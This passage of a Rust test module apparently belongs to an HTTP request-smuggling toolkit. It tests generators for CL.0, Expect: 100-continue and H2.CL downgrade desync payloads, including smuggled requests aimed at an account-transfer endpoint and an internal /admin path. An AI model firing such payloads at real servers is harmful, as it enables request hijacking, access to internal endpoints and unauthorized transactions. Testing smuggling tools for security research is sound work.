        let p = expect_100_smuggle(smuggled, cl).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.contains("Expect: 100-continue\r\n"));
        assert!(s.contains("POST /account/transfer HTTP/1.1\r\n"));
        assert!(s.contains("amount=999"));
    }

    /// **CVE-class: H2.CL downgrade** — reproduces the browser-powered H2
    /// desync where the proxy inherits a conflicting Content-Length.  This is
    /// the mechanism behind several $30k–$80k HackerOne bounties from 2024–2025.
    #[test]
    fn adversarial_h2_cl_downgrade_cve_class() {
        use crate::h2_evasion::H2TargetFlaw;
        let body = b"GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n";
        // Declared CL intentionally less than body — triggers H2.CL desync.
        let declared_cl = 5;
        let evasion = browser_powered_h2_downgrade("POST", "/api/data", body, declared_cl).unwrap();
        assert_eq!(evasion.target_flaw, H2TargetFlaw::ProtocolDowngrade);
        let cl_header = evasion.headers.iter()
            .find(|(k, _)| k == "content-length")
            .expect("content-length header must be present");
        // The declared CL is 5 — intentionally shorter than the real body.
        assert_eq!(cl_header.1, "5", "declared CL must be 5 (mismatched desync)");
        // Both CL and TE present → H2.CL + H2.TE ambiguity.
        let has_te = evasion.headers.iter().any(|(k, v)| k == "transfer-encoding" && v == "chunked");
        assert!(has_te, "must have transfer-encoding: chunked for H2.TE desync");
    }

    // ── Concurrency stress ──────────────────────────────────────────────────

    /// All Kettle BH25 primitives are safe to call from multiple threads
    /// simultaneously and produce deterministic output (modulo canary).
    #[test]
    fn kettle_primitives_concurrency_stress() {
        use std::thread;
        let handles: Vec<_> = (0..10)
            .map(|i| {
                thread::spawn(move || {
                    let seed = i * 13 + 7;
                    for _ in 0..20 {
                        // 1. zero_cl_desync
                        let p = zero_cl_desync("/con", "GET /x HTTP/1.1", seed).unwrap();
                        assert!(!p.raw_bytes.is_empty(), "zero_cl_desync must not be empty");

                        // 2. vh_masked_header
                        let vs = vh_masked_header("Host", "t").unwrap();
                        assert_eq!(vs.len(), 2, "vh_masked_header must return 2");

                        // 3. expect_100_smuggle
                        let p = expect_100_smuggle("GET /x HTTP/1.1", seed).unwrap();
                        assert!(!p.raw_bytes.is_empty());

                        // 4. expect_100_obfuscated
                        let vs = expect_100_obfuscated("", "", "X", seed).unwrap();
                        assert!(!vs.is_empty());

                        // 5. cl_zero_via_expect
                        let p = cl_zero_via_expect("GET /x HTTP/1.1", seed).unwrap();
                        assert!(!p.raw_bytes.is_empty());

                        // 6. double_desync
                        let bytes = double_desync("/con", "/images/", "X").unwrap();
                        assert!(!bytes.is_empty());

                        // 7. malformed_host_split
                        let vs = malformed_host_split("example.com").unwrap();
                        assert_eq!(vs.len(), 8);

                        // 8. browser_powered_h2_downgrade
                        let e = browser_powered_h2_downgrade("GET", "/", b"", 0).unwrap();
                        assert_eq!(e.pseudo_headers.len(), 3);

                        // 9. line_folded_header
                        let bytes = line_folded_header("Content-Length", "5", "x");
                        assert!(!bytes.is_empty());

                        // 10. chunk_extension_variants
                        let vs = chunk_extension_variants("X").unwrap();
                        assert_eq!(vs.len(), 8);
                    }
                })
            })
            .collect();
        for h in handles {
            h.join().expect("thread must not panic");
        }
    }
}
